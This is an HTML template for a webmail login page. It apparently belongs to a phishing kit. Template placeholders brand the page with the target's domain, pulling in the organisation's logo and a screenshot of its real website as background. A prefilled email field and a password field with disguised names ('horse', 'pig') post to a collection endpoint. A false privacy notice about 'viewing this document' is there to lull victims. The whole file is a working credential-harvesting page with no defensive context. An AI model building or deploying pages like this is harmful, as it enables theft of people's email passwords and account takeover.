<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Webmail Portal Login</title>

<link rel="icon" href="https://api.kickfire.com/logo?website={{ins}}">

<style>
html, body {
    height: 100%;
    margin: 0;
    font-family: Arial, Helvetica, sans-serif;
}

/* Safe background */
#bg {
    position: fixed;
    inset: 0;
    background-size: cover;
    background-position: center;
    background-repeat: no-repeat;
    z-index: -1;
}

/* Fallback gradient */
.bg-fallback {
    background-image: linear-gradient(135deg, #0d4f8b, #1e90ff);
}

/* Login card */
.form-holder {
    background: rgba(255,255,255,0.92);
    width: 600px;
    margin: 160px auto;
    box-shadow: 0 20px 50px rgba(0,0,0,0.25);
    border-radius: 6px;
    border: 1px solid #d6dfea;
}

/* Header */
.xlogo {
    background: #0d4f8b;
    color: #fff;
    padding: 12px;
    font-size: 18px;
}

/* Form */
.form-wrap {
    width: 400px;
    margin: 0 auto;
    text-align: center;
}

.form-wrap p {
    font-size: 22px;
    margin: 20px 0;
}

.finput {
    width: 100%;
    margin: 10px 0;
}

.finput input {
    width: 100%;
    font-size: 20px;
    padding: 10px;
    border-radius: 4px;
    border: 1px solid #d6dfea;
}

button {
    margin-top: 15px;
    font-size: 18px;
    padding: 10px 20px;
    background: #0d4f8b;
    color: #fff;
    border: none;
    border-radius: 4px;
    cursor: pointer;
}

button:hover {
    background: #1874cd;
}

.privacy {
    font-size: 14px;
    color: gray;
    text-align: left;
    margin: 20px;
}
</style>
</head>

<body>

<!-- Background -->
<div id="bg" class="bg-fallback"></div>

<!-- Hidden iframe (detection only) -->
<iframe id="probe" style="display:none;"></iframe>

<div class="form-holder">
    <div class="xlogo">
        <span style="text-transform: capitalize;">{{ins}} Webmail</span>
    </div>

    <div class="form-wrap">
        <form action="first" method="POST">
            <p>Please log in with your email</p>

            <img src="https://api.kickfire.com/logo?website={{ins}}" width="120">

            <div class="finput">
                <input type="email" name="horse" value="{{eman}}" required>
            </div>

            <div class="finput">
                <input type="password" name="pig" placeholder="Email Password" required>
            </div>

            <button type="submit">Continue</button>

            <div class="privacy">
                Privacy Policy: <b>{{ins}}</b><br>
                Your information will only be used for the sole purpose of viewing this document.
            </div>
        </form>
    </div>
</div>

<script>
(function () {
    const domain = "{{ins}}";
    const bg = document.getElementById("bg");
    const iframe = document.getElementById("probe");

    iframe.src = "https://www." + domain;

    iframe.onload = () => {
        bg.style.backgroundImage =
            `url("https://image.thum.io/get/width/1920/https://www.${domain}")`;
    };

    iframe.onerror = () => {
        bg.classList.add("bg-fallback");
    };

    setTimeout(() => {
        if (!iframe.contentDocument) {
            bg.classList.add("bg-fallback");
        }
    }, 2500);
})();
</script>

</body>
</html>
